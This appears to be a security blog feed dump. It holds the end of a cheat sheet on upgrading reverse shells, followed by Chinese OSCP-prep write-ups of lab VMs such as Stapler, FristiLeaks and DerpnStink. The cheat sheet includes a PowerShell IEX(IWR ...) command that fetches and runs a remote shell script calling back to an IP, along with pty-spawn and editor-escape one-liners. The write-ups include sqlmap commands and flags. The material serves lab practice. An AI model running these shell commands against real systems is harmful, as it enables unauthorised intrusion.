<p>:warning: OhMyZSH might break this trick, a simple <code>sh</code> is recommended</p>
<blockquote>
<p>The main problem here is that zsh doesn’t handle the stty command the same way bash or sh does. […] stty raw -echo; fg[…] If you try to execute this as two separated commands, as soon as the prompt appear for you to execute the fg command, your -echo command already lost its effect</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ctrl+z</span><br><span class="line">echo <span class="variable">$TERM</span> &amp;&amp; tput lines &amp;&amp; tput cols</span><br><span class="line"></span><br><span class="line"><span class="comment"># for bash</span></span><br><span class="line">stty raw -echo</span><br><span class="line">fg</span><br><span class="line"></span><br><span class="line"><span class="comment"># for zsh</span></span><br><span class="line">stty raw -echo; fg</span><br><span class="line"></span><br><span class="line">reset</span><br><span class="line">export SHELL=bash</span><br><span class="line">export TERM=xterm-<span class="number">256</span>color</span><br><span class="line">stty rows &lt;num&gt; columns &lt;cols&gt;</span><br></pre></td></tr></table></figure>

<p>or use <code>socat</code> binary to get a fully tty reverse shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat file:`tty`,raw,<span class="built_in">echo</span>=0 tcp-listen:12345</span><br></pre></td></tr></table></figure>

<p>Spawn a TTY shell from an interpreter</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">/bin/sh -i</span><br><span class="line">python3 -c <span class="string">'import pty; pty.spawn("/bin/sh")'</span></span><br><span class="line">python3 -c <span class="string">"__import__('pty').spawn('/bin/bash')"</span></span><br><span class="line">python3 -c <span class="string">"__import__('subprocess').call(['/bin/bash'])"</span></span><br><span class="line">perl -e <span class="string">'exec "/bin/sh";'</span></span><br><span class="line">perl: exec <span class="string">"/bin/sh"</span>;</span><br><span class="line">perl -e <span class="string">'print `/bin/bash`'</span></span><br><span class="line">ruby: exec <span class="string">"/bin/sh"</span></span><br><span class="line">lua: os.execute(<span class="string">'/bin/sh'</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>vi: <code>:!bash</code></li>
<li>vi: <code>:set shell=/bin/bash:shell</code></li>
<li>nmap: <code>!sh</code></li>
<li>mysql: <code>! bash</code></li>
</ul>
<p>Alternative TTY method</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@debian:/dev/shm$ su - user</span><br><span class="line">su: must be run from a terminal</span><br><span class="line"></span><br><span class="line">www-data@debian:/dev/shm$ /usr/bin/script -qc /bin/bash /dev/null</span><br><span class="line">www-data@debian:/dev/shm$ su - user</span><br><span class="line">Password: P4ssW0rD</span><br><span class="line"></span><br><span class="line">user@debian:~$</span><br></pre></td></tr></table></figure>

<h2 id="Fully-interactive-reverse-shell-on-Windows"><a href="#Fully-interactive-reverse-shell-on-Windows" class="headerlink" title="Fully interactive reverse shell on Windows"></a>Fully interactive reverse shell on Windows</h2><p>The introduction of the Pseudo Console (ConPty) in Windows has improved so much the way Windows handles terminals.</p>
<p><strong>ConPtyShell uses the function <a href="https://docs.microsoft.com/en-us/windows/console/createpseudoconsole" target="_blank" rel="noopener">CreatePseudoConsole()</a>. This function is available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763).</strong></p>
<p>Server Side:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stty raw -echo; (stty size; cat) | nc -lvnp 3001</span><br></pre></td></tr></table></figure>

<p>Client Side:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001</span><br></pre></td></tr></table></figure>

<p>Offline version of the ps1 available at –&gt; <a href="https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1" target="_blank" rel="noopener">https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1</a></p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul>
<li><a href="https://security.stackexchange.com/questions/166643/reverse-bash-shell-one-liner" target="_blank" rel="noopener">Reverse Bash Shell One Liner</a></li>
<li><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">Pentest Monkey - Cheat Sheet Reverse shell</a></li>
<li><a href="http://netsec.ws/?p=337" target="_blank" rel="noopener">Spawning a TTY Shell</a></li>
<li><a href="https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell" target="_blank" rel="noopener">Obtaining a fully interactive shell</a></li>
</ul>
]]></content>
      <tags>
        <tag>资料</tag>
      </tags>
  </entry>
  <entry>
    <title>备战OSCP_Tr0ll_1</title>
    <url>/2020/10/10/%E5%A4%87%E6%88%98OSCP_Tr0ll_1/</url>
    <content><![CDATA[<h2 id="发现靶机"><a href="#发现靶机" class="headerlink" title="发现靶机"></a>发现靶机</h2><p><img src="https://i.loli.net/2020/10/10/YrEKSxOv6gsH713.png" alt="clipboard.png"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><a id="more"></a>
<p><img src="https://i.loli.net/2020/10/10/bHv2IuNaSAtTj1l.png" alt="1.png"><br><img src="https://i.loli.net/2020/10/10/npxdiwaGtqIm73j.png" alt="2.png"><br><img src="https://i.loli.net/2020/10/10/39tnxbpWic8e4XT.png" alt="3.png"></p>
<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p><img src="https://i.loli.net/2020/10/10/h38VrCESaTcP4Z2.png" alt="4.png"><br>发现ftp弱口令，两个凭证进去均只有一个lol.pcap<br><img src="https://i.loli.net/2020/10/10/dp769k5FCYxEPSj.png" alt="5.png"><br>在包里发现线索</p>
<p><img src="https://i.loli.net/2020/10/10/AY8aX5qg1MQEfDi.png" alt="6.png"><br><img src="https://i.loli.net/2020/10/10/oFQ4BU2PMp9Xrst.png" alt="7.png"><br>下载这个二进制，查看了二进制中的字符串，发现了一个提示。运行之后也并无变化，也只有这个提示<br><img src="https://i.loli.net/2020/10/10/m5zbYTGAJPp1k6E.png" alt="8.png"><br>按照提示，发现新目录<br><img src="https://i.loli.net/2020/10/10/ZUmO261cv7tdpr4.png" alt="9.png"><br>两个目录中的信息，看起来应该还是字典<br><img src="https://i.loli.net/2020/10/10/b976XK24ajUion8.png" alt="10.png"></p>
<p><img src="https://i.loli.net/2020/10/10/zJjDPkHYCnvraox.png" alt="11.png"><br>机制如我，把本次靶场出现过的所有单次都加上去，报错那个提示句都拆开加上<br><img src="https://i.loli.net/2020/10/10/k6HgjQmVO5FEisd.png" alt="12.png"><br><img src="https://i.loli.net/2020/10/10/vx1rI7SHDRydXUi.png" alt="13.png"></p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p><img src="https://i.loli.net/2020/10/10/h8KHU76DorRyOjc.png" alt="14.png"></p>
]]></content>
      <tags>
        <tag>OSCP</tag>
      </tags>
  </entry>
  <entry>
    <title>备战OSCP_SickOS_2</title>
    <url>/2020/10/10/%E5%A4%87%E6%88%98OSCP_SickOS_2/</url>
    <content><![CDATA[<h2 id="发现靶机"><a href="#发现靶机" class="headerlink" title="发现靶机"></a>发现靶机</h2><p><img src="https://i.loli.net/2020/10/10/Wkah5mPdBz2cH9Q.png" alt="clipboard.png"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><a id="more"></a>
<p><img src="https://i.loli.net/2020/10/10/HBSlzYN8tLa3Cde.png" alt="1.png"><br><img src="https://i.loli.net/2020/10/10/tSsxgdM9JlIYmnG.png" alt="2.png"><br>发现一个test目录，但是里面还是空的，22端口也爆破无果</p>
<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p><img src="https://i.loli.net/2020/10/10/4NSczxueJyhdmRB.png" alt="3.png"><br><img src="https://i.loli.net/2020/10/10/lv6UqNk5oEDueAi.png" alt="4.png"><br>无意间发现找到这个http开启了很多模式，尝试put上传<br><img src="https://i.loli.net/2020/10/10/unk7LtoBVKbDq9s.png" alt="5.png"><br><img src="https://i.loli.net/2020/10/10/3rQdWUO1zoTEjnY.png" alt="6.png"><br>成功，说明该方法可用，现在就想办法getshell了<br><img src="https://i.loli.net/2020/10/10/eEDMlgGadPRKYHB.png" alt="7.png"><br><img src="https://i.loli.net/2020/10/10/8bmqWc4R9BUzsJn.png" alt="78.png"><br><img src="https://i.loli.net/2020/10/10/iKqfZpNjvtURDWS.png" alt="9.png"></p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>提权这块一开始一直用溢出提权但是没有效果，中间还打崩了很多次系统，后来看了别人的wp才发现还有个chkrootkit的东西<br>先贴方法<br><img src="https://i.loli.net/2020/10/10/T9xnQE4GgMN1Bu7.png" alt="Image 14.png"><br>在/tmp下创建一个update，然后赋权将代码echo进去<br>等待一会后就成功提到root了<br><img src="https://i.loli.net/2020/10/10/fDcSE7xhTajlV6L.png" alt="Image 15.png"></p>
]]></content>
      <tags>
        <tag>OSCP</tag>
      </tags>
  </entry>
  <entry>
    <title>备战OSCP_SickOS_1</title>
    <url>/2020/08/22/%E5%A4%87%E6%88%98OSCP_SickOS_1/</url>
    <content><![CDATA[<h2 id="发现靶机"><a href="#发现靶机" class="headerlink" title="发现靶机"></a>发现靶机</h2><p><img src="https://i.loli.net/2020/08/22/Vh1EcQlN7qTrDbH.png" alt="clipboard.png"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><a id="more"></a>
<p>端口<br><img src="https://i.loli.net/2020/08/22/tTBjfXPwo6LCgZO.png" alt="clipboard (1).png"><br>显示3128是个http代理</p>
<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>打开发现啥也没有，但是显示出了squid3.1.19<br><img src="https://i.loli.net/2020/08/22/GWaXbDE85AflCMj.png" alt="clipboard (2).png"><br>配置代理</p>
<p><img src="https://i.loli.net/2020/08/22/JcG6tIQEmenyokp.png" alt="clipboard-1.png"></p>
<p>发现80有东西<br><img src="https://i.loli.net/2020/08/22/rehYsJ3VuBnx28l.png" alt="clipboard.png"><br>挂上代理扫目录<br><img src="https://i.loli.net/2020/08/22/IORCJzHuBYyagDT.png" alt="clipboard-1.png"><br>robots.txt发现个cms<br><img src="https://i.loli.net/2020/08/22/Ve7gUEF1JMiOoSw.png" alt="clipboard-2.png"></p>
<p>后台<br><img src="https://i.loli.net/2020/08/22/E1uC3JATLqWUspV.png" alt="clipboard.png"></p>
<p>……..   admin/admin直接进去，醉了<br>直接写了个phpinfo<br><img src="https://i.loli.net/2020/08/22/PJOGEoQ1YVjAc3b.png" alt="clipboard-1.png"></p>
<p>通过看ico图片可以找到真实的路径，当然了，也可以试出来<br><img src="https://i.loli.net/2020/08/22/LlCawr1XuJKtiWh.png" alt="clipboard-2.png"><br><img src="https://i.loli.net/2020/08/22/iU7SjGFwEMyKBIC.png" alt="clipboard-3.png"><br>找到了刚刚写的phpinfo，没想到这么简单<br><img src="https://i.loli.net/2020/08/22/zlPoaEx3NnVrCku.png" alt="clipboard-4.png"><br><img src="https://i.loli.net/2020/08/22/L2GMdAFH86fXtsc.png" alt="clipboard-5.png"></p>
<p>反弹shell<br><img src="https://i.loli.net/2020/08/22/bwXMTI7dm3Jq1Ho.png" alt="clipboard.png"></p>
<p><img src="https://i.loli.net/2020/08/22/dOIATqwQUlzXJCe.png" alt="clipboard-1.png"></p>
<p><img src="https://i.loli.net/2020/08/22/fSqFl2ruxyHCA1k.png" alt="clipboard-2.png"></p>
<p><img src="https://i.loli.net/2020/08/22/9LSJvgH1obZWGOY.png" alt="clipboard-3.png"></p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>老方法<br><img src="https://i.loli.net/2020/08/22/6pOiz5C8VU3ZIQX.png" alt="clipboard.png"><br>内核提权失败，换LinEnum试试</p>
<p><img src="https://i.loli.net/2020/08/22/5u2xmIQjqctPOsC.png" alt="clipboard-1.png"><br><img src="https://i.loli.net/2020/08/22/tQLJRd8KPkp7c3E.png" alt="clipboard-2.png"><br><img src="https://i.loli.net/2020/08/22/IXj8Yq5dZ4FSP3N.png" alt="clipboard-3.png"></p>
<p>看一下history，显示没权限，然后看看web目录发现有个config<br><img src="https://i.loli.net/2020/08/22/N7UM25Qp8GkdeK6.png" alt="clipboard.png"><br>使用数据库的密码和passwd里的sickos账户进去了<br><img src="https://i.loli.net/2020/08/22/9er73vgniBMoDLP.png" alt="clipboard-1.png"><br>然后再看下history发现可以sudo，就成功进到了root<br><img src="https://i.loli.net/2020/08/22/aFnNogMKvIVdPAl.png" alt="clipboard.png"></p>
]]></content>
      <tags>
        <tag>OSCP</tag>
      </tags>
  </entry>
  <entry>
    <title>人生</title>
    <url>/2020/07/24/%E4%BA%BA%E7%94%9F/</url>
    <content><![CDATA[<p>生 老 病 死</p><a id="more"></a>
<hr>
<p>2021年5月7日更新：</p>
<p>生者奋进！</p>
]]></content>
  </entry>
  <entry>
    <title>备战OSCP_Stapler</title>
    <url>/2020/07/22/%E5%A4%87%E6%88%98OSCP_Stapler/</url>
    <content><![CDATA[<h2 id="发现靶机"><a href="#发现靶机" class="headerlink" title="发现靶机"></a>发现靶机</h2><p><img src="https://i.loli.net/2020/07/22/wotm3AiY7cPGyrN.png" alt="clipboard.png"><br><img src="https://i.loli.net/2020/07/22/UBs7PmcFlW3xgDZ.png" alt="clipboard.png"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><a id="more"></a>
<p>端口信息<br><img src="https://i.loli.net/2020/07/22/fHnTo6ugNOGlRLy.png" alt="image.png"><br>80端口发现一些目录但是没用<br><img src="https://i.loli.net/2020/07/22/mvsiXWgzcBuqPDl.png" alt="image.png"><br>53和139没找到合适的利用，21、22、3306等待会找到一些字典后再爆破<br>12380倒是有点东西<br><img src="https://i.loli.net/2020/07/22/PsviZR32kXBxALE.png" alt="image.png"><br><img src="https://i.loli.net/2020/07/22/XwpKnlf1TsIAQPb.png" alt="image.png"></p>
<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>/phpmyadmin/没爆出来<br>/admin112233/<br><img src="https://i.loli.net/2020/07/22/pd9DC6j5w8uxclN.png" alt="image.png"></p>
<p>/blogblog/目录是个wordpress<br><img src="https://i.loli.net/2020/07/22/8c5AHClxKPtJXf7.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2020/07/22/JL3npqADeIowSu9.png" alt="image.png"><br>wordpress版本<br><img src="https://i.loli.net/2020/07/22/SgkoC3Gv4VxrchL.png" alt="image.png"><br>发现目录遍历<br><img src="https://i.loli.net/2020/07/22/pUHeBqh49NySkXQ.png" alt="image.png"></p>
<p>其中发现各种插件版本<br><img src="https://i.loli.net/2020/07/22/RSNgYmkizQvIfds.png" alt="image.png"><br><img src="https://i.loli.net/2020/07/22/DXvOn2wjBHStIkA.png" alt="image.png"><br><img src="https://i.loli.net/2020/07/22/rPaSk3XhKcTOlb9.png" alt="image.png"><br>找了一下exp<br><img src="https://i.loli.net/2020/07/22/yC8ug3DR1jetQ2k.png" alt="image.png"><br>把url添加进去执行发现报错了<br><img src="https://i.loli.net/2020/07/22/M9WVDTXK3Fvnfr7.png" alt="image.png"><br>修改脚本，忽略ssl证书错误<br><img src="https://i.loli.net/2020/07/22/HVNUmdhpysrvWgu.png" alt="image.png"><br>执行脚本后，去主页可以看到生成了一篇文章<br><img src="https://i.loli.net/2020/07/22/OpySotaLlC2wKeI.png" alt="image.png"><br>将图片下载回本地查看,但是下载不了，无论是在目录遍历里面下载还是保存都一直失败，但是可以用curl直接读源码出来<br><img src="https://i.loli.net/2020/07/22/wuPGJRskf6mc13j.png" alt="image.png"><br>使用读取的账号密码，登录之前的phpmyadmin<br>发现了wordpress的账号密码，并将其解出来。（这里由于不知道绝对路径,没办法直接getshell）<br><img src="https://i.loli.net/2020/07/22/e5iY8FS4fqpRZv3.png" alt="image.png"><br>一个一个解出来收集做字典<br><img src="https://i.loli.net/2020/07/22/uPSWH8kgv4GofsB.png" alt="image.png"><br>使用john/incorrect登录后台<br><img src="https://i.loli.net/2020/07/22/wOPguzRbGJhEXri.png" alt="image.png"></p>
<p>功能都看了一遍发现可以使用上传插件或上传主题的方式上传php文件，然后可以在媒体出找到地址（修改404文件无权限）<br>修改reverse_shell配置</p>
<p><img src="https://i.loli.net/2020/07/22/dn3aVRpyOCHJbw7.png" alt="image.png"></p>
<p>nc开启监听并且wordpress添加上传文件</p>
<p><img src="https://i.loli.net/2020/07/22/yTprXvz6AxkgOw3.png" alt="image.png"></p>
<p>填写ftp地址，上传即可</p>
<p><img src="https://i.loli.net/2020/07/22/TxkaY5yEu8SUKm6.png" alt="image.png"></p>
<p>在媒体处可以找到地址</p>
<p><img src="https://i.loli.net/2020/07/22/KBJ2UPzFGgYZOST.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2020/07/22/BFRzYApJ9xgDsTG.png" alt="image.png"></p>
<p>访问地址即可反弹出shell<br><img src="https://i.loli.net/2020/07/22/98hSOJyKjfAtuE7.png" alt="image.png"></p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>老规矩（做吐了）</p>
<p><img src="https://i.loli.net/2020/07/22/Jb3tNnGkITawDUj.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2020/07/22/2tkyhqTF1rX4oLz.png" alt="image.png"><br>一个个试下去只有cve-2016-4557成功了。（脏牛还把机器打崩了）</p>
<p><img src="https://i.loli.net/2020/07/22/uSQjRWzMYABO8I6.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2020/07/22/59GdCWv8xrIj7QK.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2020/07/22/SwhZdKC1Y2DlsOp.png" alt="image.png"></p>
]]></content>
      <tags>
        <tag>OSCP</tag>
      </tags>
  </entry>
  <entry>
    <title>备战OSCP_FristiLeaks</title>
    <url>/2020/07/17/%E5%A4%87%E6%88%98OSCP_FristiLeaks/</url>
    <content><![CDATA[<h2 id="发现靶机"><a href="#发现靶机" class="headerlink" title="发现靶机"></a>发现靶机</h2><p><img src="https://i.loli.net/2020/07/17/tTRCBOdlg6bGpwh.png" alt="clipboard.png"><br><img src="https://i.loli.net/2020/07/17/Uebkgw23P5JCDqV.png" alt="clipboard.png"><br>在靶机开机界面也是可以看到IP的<br><img src="https://i.loli.net/2020/07/17/GEHdo2RNeDb1AO8.png" alt="clipboard.png"></p><a id="more"></a>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>就一个端口<br><img src="https://i.loli.net/2020/07/17/z4TVMJrwaQDZdIi.png" alt="image.png"><br><img src="https://i.loli.net/2020/07/17/YD6pE8XWKrZj9qQ.png" alt="image.png"><br>目录信息<br><img src="https://i.loli.net/2020/07/17/ksIlQZ7wa3TfH2h.png" alt="image.png"><br>主页没有什么js可以找的，然后在robots里面找到3个目录，但都是同样的一张照片<br><img src="https://i.loli.net/2020/07/17/7kXQFfqT8u5gVZn.png" alt="image.png"><br><img src="https://i.loli.net/2020/07/17/WhZpNPk1dYKal9U.png" alt="image.png"></p>
<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>在主页倒是发现了一些人名和一些单词，组合成字典之后发现存在fristi这个目录，是个登录页面<br><img src="https://i.loli.net/2020/07/17/CUiWNsxeKaZygPf.png" alt="image.png"></p>
<p>使用组合字典爆破并未成功，但是在页面源码中发现了一个提示、一个人名和一串base64编码<br><img src="https://i.loli.net/2020/07/17/KrhsMpl9LiyJUqQ.png" alt="image.png"><br>解码后发现是一张图片<br><img src="https://i.loli.net/2020/07/17/mawVbihAN4v9RgI.png" alt="image.png"><br>在线转换后发现是一串字符：keKkeKKeKKeKkEkkEk</p>
<p><img src="https://i.loli.net/2020/07/17/iGkHha7vU6Z859e.png" alt="image.png"><br>把发现的信息都放到字典里，对登录进行爆破，发现了正确的账号密码<br><img src="https://i.loli.net/2020/07/17/pYWNMoxOUuyZfXH.png" alt="image.png"><br>登录进去之后是一个上传页面.<br><img src="https://i.loli.net/2020/07/17/cUGlutJ9MPLjhYB.png" alt="image.png"></p>
<p>上传好reverse_shelle脚本后开启监听，然后利用apache的解析漏洞访问：http://172.21.137.76/fristi/uploads/shell.php.png反弹shell<br><img src="https://i.loli.net/2020/07/17/J4RDSPfja9bkl1G.png" alt="image.png"><br><img src="https://i.loli.net/2020/07/17/ArkWmIgBsyh8PpR.png" alt="image.png"></p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>初始为低权限用户<br><img src="https://i.loli.net/2020/07/17/Ypq3WXvO1E7PZBl.png" alt="image.png"><br>老规矩，上suggester<br><img src="https://i.loli.net/2020/07/17/TwRIDomcgbiQM5j.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2020/07/17/8oIVck6u1mHJj94.png" alt="image.png"><br><img src="https://i.loli.net/2020/07/17/WKtYnqovhMXAUcQ.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2020/07/17/4Wl5MRFpLjtGXzP.png" alt="image.png"></p>
]]></content>
      <tags>
        <tag>OSCP</tag>
      </tags>
  </entry>
  <entry>
    <title>备战OSCP_DerpnStink</title>
    <url>/2020/07/16/%E5%A4%87%E6%88%98OSCP_DerpnStink/</url>
    <content><![CDATA[<h2 id="发现靶机"><a href="#发现靶机" class="headerlink" title="发现靶机"></a>发现靶机</h2><p><img src="https://i.loli.net/2020/07/16/1NBawJ9Z7ftLDnY.png" alt="clipboard.png"><br><img src="https://i.loli.net/2020/07/16/OMnWo8pHVaSdew1.png" alt="clipboard.png"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><a id="more"></a>
<p>端口信息：<br><img src="https://i.loli.net/2020/07/16/muVZR8a5tnIGMjC.png" alt="image.png"></p>
<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>80端口：<br><img src="https://i.loli.net/2020/07/16/hiXqTJwUARY2eaH.png" alt="image.png"><br>flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166)<br><img src="https://i.loli.net/2020/07/16/ExhqzdeJyT9wBX8.png" alt="image.png"><br>找到一个js信息<br><img src="https://i.loli.net/2020/07/16/8zkuUegjLRpBGZ2.png" alt="image.png"><br><img src="https://i.loli.net/2020/07/16/EAZIYT5wfF9r34b.png" alt="image.png"><br>哈哈，oscp金句<br><img src="https://i.loli.net/2020/07/16/3xZcJHuDTnjhPAv.png" alt="image.png"><br>发现phpmyadmin<br><img src="https://i.loli.net/2020/07/16/aqMx4tiSwXL6frN.png" alt="image.png"><br>爆破一下<br><img src="https://i.loli.net/2020/07/16/ZQmYlXp1LURGVvf.png" alt="image.png"><br>结果是mysql<br><img src="https://i.loli.net/2020/07/16/vLyDuJh2gtC34ra.png" alt="image.png"><br>wordpress???<br><img src="https://i.loli.net/2020/07/16/c9JeaAzTxBQkFG4.png" alt="image.png"></p>
<p>在其中一个表里发现了<br>flag2(a7d355b26bda6bf1196ccffead0b2cf2b81f0a9de5b4876b44407f1dc07e51e6)<br><img src="https://i.loli.net/2020/07/16/iJvNorySanwHXq8.png" alt="image.png"><br>并且还有一些用户名密码之类的信息，都收集起来，后面做字典用<br><img src="https://i.loli.net/2020/07/16/1q9G4XWFa6rz5Ji.png" alt="image.png"><br>说出来可能不信，我又看了一下wp，才知道unclestinky的hash是要用rockyou破解，这nm的谁能想到啊，作者出来挨打！<br><img src="https://i.loli.net/2020/07/16/4V8hXsJIiSezd71.png" alt="clipboard.png"><br><img src="https://i.loli.net/2020/07/16/wdnGf3DEbBo4XLZ.jpg" alt="download.jpg"><br>统计一下目前收集到的字典信息<br>stinky、derpnstink、Derp、Stinky、unclestinky、wedgie57、admin<br>将以上信息组成字典用来爆破ftp和ssh<br>ftp有结果：stinky/wedgie57<br><img src="https://i.loli.net/2020/07/16/e12FxBfzawAlUi4.png" alt="image.png"><br>ssh不支持密码认证<br><img src="https://i.loli.net/2020/07/16/v4mL8CteMjlN5Bo.png" alt="image.png"><br>在ftp的目录下发现了一个私钥<br><img src="https://i.loli.net/2020/07/16/VEPYb7KeMNsa5gI.png" alt="image.png"><br>ssh进去了，前面给key.txt加了个400权限就可以了<br><img src="https://i.loli.net/2020/07/16/FGWTl7brO3SV19y.png" alt="image.png"><br><img src="https://i.loli.net/2020/07/16/ns3CdLcGZ1gpirb.png" alt="image.png"><br>第3个flag<br>flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)<br><img src="https://i.loli.net/2020/07/16/YawJXI3xtOSANPv.png" alt="image.png"></p>
<h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><p>第4个flag应该是要root的，毕竟是boot2root的机器<br>老规矩<br><img src="https://i.loli.net/2020/07/16/6zdtKUQ1HlbNchs.png" alt="image.png"><br>GG一个都没试出来<br>倒是发现了一个流量包，在流量包中发现了新的账号密码，而这个账户对应了前面ssh进去里/home文件夹下的另外一个文件夹<br>另外我还发现了原来之前说绑定hosts的域名是derpnstink.local，难怪我没找到wordpress，我之前试的时候是com，我以为是作者开的玩笑。。。<br><img src="https://i.loli.net/2020/07/16/AOnM1t7eXF8s3yr.png" alt="image.png"></p>
<p>mrderp：derpderpderpderpderpderpderp<br><img src="https://i.loli.net/2020/07/16/Ug86d7tIAqOYuHz.png" alt="image.png"><br>成功进到mrderp里面,sudo -l之后可以看到显示这样的路径文件是可以用root执行的<br><img src="https://i.loli.net/2020/07/16/Ratx3IokU28rXzK.png" alt="image.png"><br>然后就写个bash进去吧<br><img src="https://i.loli.net/2020/07/16/8jIsimGSBx1CLhc.png" alt="image.png"><br>第4个flag<br>flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)<br><img src="https://i.loli.net/2020/07/16/jFW73IBdtXNOybp.png" alt="image.png"></p>
]]></content>
      <tags>
        <tag>OSCP</tag>
      </tags>
  </entry>
  <entry>
    <title>备战OSCP_LordOfTheRoot</title>
    <url>/2020/07/15/%E5%A4%87%E6%88%98OSCP_LordOfTheRoot/</url>
    <content><![CDATA[<h2 id="发现靶机"><a href="#发现靶机" class="headerlink" title="发现靶机"></a>发现靶机</h2><p><img src="https://i.loli.net/2020/07/15/zdkKILs5nbefWEQ.png" alt="clipboard.png"><br><img src="https://i.loli.net/2020/07/15/VOH4ZFLsrPclYyE.png" alt="clipboard.png"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><a id="more"></a>
<p>端口信息：<br><img src="https://i.loli.net/2020/07/15/xbrRUgjGdP3AHWs.png" alt="image.png"><br>GG，爆破了一圈，无果，看了一眼别人的wp（真就一眼，多一眼我就把键盘吃下去），原来还有“端口碰撞”这种东西，以前只听说过，根本没见过，久而久之也忘记这种东西的存在了，现在算是见识到了<br>ssh直接连接会显示”knock friend to enter”和”easy as 1,2,3”，这句话其实需要我们使用端口碰撞1，2，3端口<br>（端口碰撞： 端口上的防火墙通过产生一组预先指定关闭的端口进行连接尝试，一旦接收到正确的连接尝试序列，防火墙规则就会动态修改，以允许发送连接尝试的主机通过特定端口进行连接。）<br><img src="https://i.loli.net/2020/07/15/oGWuYwBKcFtHPUf.png" alt="image.png"><br>使用nmap端口碰撞目标<br><img src="https://i.loli.net/2020/07/15/9nHy2Aj4zdSwJkf.png" alt="image.png"><br>再次扫描端口，发现开放了1337的http服务<br><img src="https://i.loli.net/2020/07/15/fcBmdZRCG1DMliI.png" alt="image.png"></p>
<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>打开1337端口，发现就这玩意<br><img src="https://i.loli.net/2020/07/15/GZgi3F4rTWkSsHn.png" alt="image.png"><br>目录扫描结果<br><img src="https://i.loli.net/2020/07/15/GslizEoZJgmwk8S.png" alt="image.png"><br>images目录里看到了3个图片，下载回来一个个分析，发现没啥diao用<br><img src="https://i.loli.net/2020/07/15/qd91huwkr4IJoO8.png" alt="image.png"><br>然后。。。。。又看了一眼wp…….（下次一定吃），发现还有个robots.txt文件，但是为啥没扫出来呢？而且这显示的还是个图片，和正常的robots协议不一样（难道是htaccess将txt后缀解析成html？）<br><img src="https://i.loli.net/2020/07/15/36jl1xADcXhQeRZ.png" alt="image.png"><br>查看页面源码发现一段base64，双重解出来结果如下，是个路径<br><img src="https://i.loli.net/2020/07/15/KTHYjNuZSRwqzsI.png" alt="image.png"><br><img src="https://i.loli.net/2020/07/15/drT8KCHlxLIDqFN.png" alt="image.png"><br>打开目录http://172.21.137.247:1337/978345210/index.php，是个登录页面<br><img src="https://i.loli.net/2020/07/15/U1vabPt96lRQMgZ.png" alt="image.png"><br>爆破无果，但是试出来个时间盲注<br><img src="https://i.loli.net/2020/07/15/rdPqEOZMtf9NgGL.png" alt="image.png"><br>开始跑库了，时间盲注是真的慢，最后不得不–time-sec=2稍微快一点<br>数据库：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -r 1 --dbs --flush --batch --time-sec=2</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/07/15/AnqcV1MsuiY2I4K.png" alt="image.png"><br>表：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -r 1 --batch --time-sec=2 -D Webapp --tables</span><br></pre></td></tr></table></figure>
